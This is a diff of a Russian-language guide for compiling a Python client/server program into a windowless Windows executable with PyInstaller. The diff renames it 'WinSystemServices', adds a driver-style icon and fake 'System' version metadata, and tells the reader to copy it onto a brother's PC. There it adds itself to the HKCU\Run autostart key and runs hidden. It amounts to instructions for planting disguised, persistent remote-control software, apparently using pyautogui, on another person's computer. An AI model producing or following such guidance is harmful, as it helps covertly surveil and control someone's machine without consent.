@@ -1,5 +1,5 @@
 # =============================================================================
-# ИНСТРУКЦИЯ ПО КОМПИЛЯЦИИ CLIENT В EXE
+# ИНСТРУКЦИЯ ПО КОМПИЛЯЦИИ СЕРВЕРА В EXE
 # =============================================================================
 
 ## Шаг 1: Установка PyInstaller
@@ -8,34 +8,40 @@
 pip install pyinstaller
 ```
 
-## Шаг 2: Компиляция
+## Шаг 2: Компиляция сервера (WinSystemServices.exe)
 
 Выполните следующую команду в терминале:
 
 ```bash
-pyinstaller --onefile --windowed --name=WinSystemHost --icon=NONE client.py
+pyinstaller --onefile --windowed --name=WinSystemServices --icon=NONE server.py
 ```
 
 ### Параметры:
 - `--onefile` - создаёт один exe-файл (без внешних библиотек)
 - `--windowed` или `-w` - запускается без консольного окна (фоновый режим)
-- `--name=WinSystemHost` - имя exe-файла будет WinSystemHost.exe
-- `--icon=NONE` - без иконки (можно добавить свою через --icon=путь.ico)
+- `--name=WinSystemServices` - имя exe-файла будет WinSystemServices.exe
+- `--icon=NONE` - без иконки
+
+### С иконкой стандартного драйвера:
+```bash
+pyinstaller --onefile --windowed --name=WinSystemServices --icon=driver.ico server.py
+```
+Замените `driver.ico` на путь к вашему файлу иконки.
 
 ## Шаг 3: Результат
 
 После компиляции появится папка `dist`, в которой будет файл:
 ```
-dist/WinSystemHost.exe
+dist/WinSystemServices.exe
 ```
 
 ## Шаг 4: Запуск
 
-Скопируйте `WinSystemHost.exe` на ПК родственника и запустите.
+Скопируйте `WinSystemServices.exe` на ПК брата и запустите.
 Программа:
 1. Добавится в автозапуск (реестр HKCU\Run)
 2. Будет работать в фоновом режиме (без окна консоли)
-3. Называется в диспетчере задач как WinSystemHost
+3. Называется в диспетчере задач как WinSystemServices
 
 ## Проверка автозапуска
 
@@ -64,12 +70,12 @@ winreg.CloseKey(key)
 
 ### Скрытый импорт (если pyautogui не работает в exe)
 ```bash
-pyinstaller --onefile --windowed --name=WinSystemHost --hidden-import=pyautogui --hidden-import=PIL client.py
+pyinstaller --onefile --windowed --name=WinSystemServices --hidden-import=pyautogui --hidden-import=PIL server.py
 ```
 
 ### Указание версии (для информации в exe)
 ```bash
-pyinstaller --onefile --windowed --name=WinSystemHost --version-file=version_info.txt client.py
+pyinstaller --onefile --windowed --name=WinSystemServices --version-file=version_info.txt server.py
 ```
 
 Где version_info.txt:
@@ -92,7 +98,7 @@ VSVersionInfo(
           u'040904E4',
           [
             StringStruct(u'FileVersion', u'1.0.0.0'),
-            StringStruct(u'ProductName', u'WinSystemHost'),
+            StringStruct(u'ProductName', u'WinSystemServices'),
             StringStruct(u'CompanyName', u'System'),
             StringStruct(u'LegalCopyright', u'System')
           ]
